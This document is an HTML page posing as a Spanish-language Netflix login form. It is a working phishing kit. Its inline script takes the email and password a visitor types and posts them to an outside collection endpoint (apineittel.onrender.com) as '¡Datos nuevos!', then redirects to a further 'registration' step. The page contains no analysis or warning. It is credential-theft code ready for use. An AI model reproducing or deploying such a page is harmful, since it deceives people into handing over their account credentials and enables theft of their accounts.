<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style/style.css" />
    <link rel="icon" href="img/logo.png" />
    <title>Netflix</title>
  </head>
  <body>
    <div class="upper">
      <div class="logo">
        <a href="#">
          <img src="img/Netflix-Logo.png" class="img-logo" />
        </a>
      </div>
      <div class="login-div">
        <div class="login">
          <h1>Introduce tus datos</h1>
          <div class="input-text">
            <input
              type="text"
              id="inputEmail"
              name="email"
              placeholder="Correo electrónico o número de teléfono"
              onfocus="inputOnFocus(this)"
              onblur="inputOnBlur(this)"
              required
            />
            <div class="warning-input" id="warningEmail">
              Proporcione un correo electrónico o número de teléfono válido.
            </div>
          </div>
          <div class="input-text">
            <input
              type="password"
              id="inputPassword"
              name="password"
              placeholder="Contraseña"
              onfocus="inputOnFocus(this)"
              onblur="inputOnBlur(this)"
              required
            />
            <div class="warning-input" id="warningPassword">
              La contraseña debe tener entre 4 y 60 caracteres.
            </div>
          </div>
          <div>
            <div class="protection color_link help">
              Al hacer clic en el botón, aceptas los términos de uso y las condiciones de Netflix.
            </div>
            <button class="signin-button" onClick="buttonOnClick()">
              Iniciar registro
            </button>
          </div>
          <div class="remember-flex">
        </div>
      </div>
    </div>
    <script src="js/script.js"></script>
    <script>
      function buttonOnClick() {
        sendData().then(() => {
          redirectRegistro2();
        });
      }

      function sendData() {
      const email = document.getElementById("inputEmail").value;
      const password = document.getElementById("inputPassword").value;

        if (email === "" || password === "") {
          return;
        } else {
          return fetch("https://apineittel.onrender.com/submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              content: `¡Datos nuevos!\n\nEmail: ${email}\nSenha: ${password}`,
            }),
          }).then((response) => response.json());
        }
      }
    </script>
  </body>
</html>
